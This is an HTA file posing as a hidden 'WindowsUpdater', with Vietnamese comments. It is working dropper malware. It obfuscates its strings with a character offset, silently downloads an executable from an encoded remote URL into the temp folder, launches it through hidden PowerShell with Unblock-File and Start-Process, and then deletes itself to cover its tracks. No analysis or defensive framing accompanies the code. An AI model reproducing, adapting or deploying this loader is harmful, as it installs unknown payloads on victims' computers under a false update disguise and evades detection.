<html>
<head>
    <hta:application id="WindowsUpdater" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
    <script language="javascript">
        window.moveTo(-3000, -3000);
        window.resizeTo(0, 0);

        function decode(arr, offset) {
            var str = "";
            for (var i = 0; i < arr.length; i++) {
                str += String.fromCharCode(arr[i] - offset);
            }
            return str;
        }

        window.onload = function() {
            try {
                // 1. Lấy đường dẫn file hiện tại để lát nữa tự sát
                var p = window.location.pathname;
                if (p.charAt(0) == '/') p = p.substring(1);
                p = p.replace(/\//g, '\\');

                // n1: "WScript.Shell" (Offset 363)
                var n1 = [450, 446, 462, 477, 468, 475, 479, 409, 446, 467, 464, 471, 471];
                var sh = new ActiveXObject(decode(n1, 363));

                // 2. Cấu hình tải file
                var url = [467, 479, 479, 475, 478, 421, 410, 410, 466, 468, 478, 479, 409, 466, 468, 479, 467, 480, 461, 480, 478, 464, 477, 462, 474, 473, 479, 464, 473, 479, 409, 462, 474, 472, 410, 470, 467, 474, 460, 473, 464, 412, 413, 410, 415, 419, 416, 413, 465, 420, 420, 465, 460, 413, 413, 465, 465, 461, 463, 415, 460, 413, 414, 419, 413, 460, 463, 415, 414, 413, 417, 464, 411, 464, 461, 416, 410, 477, 460, 482, 410, 418, 414, 463, 462, 463, 411, 460, 415, 462, 465, 417, 465, 414, 413, 418, 465, 417, 418, 462, 414, 412, 461, 416, 420, 465, 419, 462, 419, 416, 412, 411, 419, 416, 413, 416, 418, 420, 460, 417, 411, 410, 450, 468, 473, 463, 474, 482, 478, 448, 475, 463, 460, 479, 464, 477, 409, 464, 483, 464];
                var url1 = decode(url, 363);

                var t = sh.ExpandEnvironmentStrings("%TEMP%") + "\\WindowsUpdater.exe";

                // 3. Logic Tải file Native (ADODB.Stream) - Không dùng Certutil
                var xml1 = [440, 446, 451, 440, 439, 413, 409, 451, 440, 439, 435, 447, 447, 443];

                var xml = new ActiveXObject(decode(xml1, 363));
                xml.open("GET", url1, false);
                xml.send();

                var stream1 = [428, 431, 442, 431, 429, 409, 446, 479, 477, 464, 460, 472];

                if (xml.status == 200) {
                    var stream = new ActiveXObject(decode(stream1, 363));
                    stream.Open();
                    stream.Type = 1; // Binary
                    stream.Write(xml.responseBody);
                    stream.SaveToFile(t, 2); // 2 = Overwrite
                    stream.Close();

                    // 4. Thực thi file đã tải (Unblock + Run)
                    // Dùng PowerShell chạy ngầm để không hiện cửa sổ

                    // nA: powershell -w h -c "
                    var nA = [475, 474, 482, 464, 477, 478, 467, 464, 471, 471, 395, 408, 482, 395, 467, 395, 408, 462, 395, 397];
                    // nB: Unblock-File '
                    var nB = [448, 473, 461, 471, 474, 462, 470, 408, 433, 468, 471, 464, 395, 402];
                    // nC: '; Start-Process '
                    var nC = [402, 422, 395, 446, 479, 460, 477, 479, 408, 443, 477, 474, 462, 464, 478, 478, 395, 402];
                    // nD: '"
                    var nD = [402, 397];

                    // Cong chuoi hoan chinh
                    var execCmd = decode(nA, 363) + decode(nB, 363) + t + decode(nC, 363) + t + decode(nD, 363);

                    sh.Run(execCmd, 0, false);
                }

                //          powershell -w h -c "Unblock-File 'C:\path\to\file.exe'; Start-Process 'C:\path\to\file.exe'"
                // CCCCCCC "powershell -w h -c \"Unblock-File '" + t + "'; Start-Process '" + t + "'\"";

                // 5. Logic Tự sát (Self-Delete)
                // Tạo một tiến trình PowerShell đợi 3 giây (để HTA đóng hẳn) rồi xóa file

                // nA: Là kết quả mã hóa của đoạn "powershell -w h -c "Start-Sleep -s 3; Remove-Item '"
                var nA = [475, 474, 482, 464, 477, 478, 467, 464, 471, 471, 395, 408, 482, 395, 467, 395, 408, 462, 395, 397, 446, 479, 460, 477, 479, 408, 446, 471, 464, 464, 475, 395, 408, 478, 395, 414, 422, 395, 445, 464, 472, 474, 481, 464, 408, 436, 479, 464, 472, 395, 402];

                // nB: Là kết quả mã hóa của đoạn "' -Force""
                var nB = [402, 395, 408, 433, 474, 477, 462, 464, 397];

                // Lắp ráp "kẹp thịt" biến p ở giữa
                var suicideCmd = decode(nA, 363) + p + decode(nB, 363);
                sh.Run(suicideCmd, 0, false);

            } catch (e) {}
            window.close();
        };
    </script>
</head>
<body style="background:transparent;"></body>
</html>